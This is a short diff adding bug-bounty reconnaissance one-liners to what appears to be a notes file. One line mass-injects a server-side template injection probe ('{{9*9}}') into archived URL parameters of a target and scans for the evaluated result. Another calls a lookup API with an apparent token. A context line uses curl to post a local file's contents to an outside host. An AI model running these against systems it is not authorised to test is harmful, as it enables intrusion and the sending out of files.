@@ -1,6 +1,6 @@
 
-
-
+waybackurls http://bounty.com | grep '=' | qsreplace "kingofbounty{{9*9}}"  | httpx -match-regex 'kingofbounty81' -threads 300 -http-proxy http://127.0.0.1:8080/
+curl https://host.io/api/full/{ domain.com }?token=50cd58723e4a97
 
 curl -F "x=`cat test.txt`" example.com
 
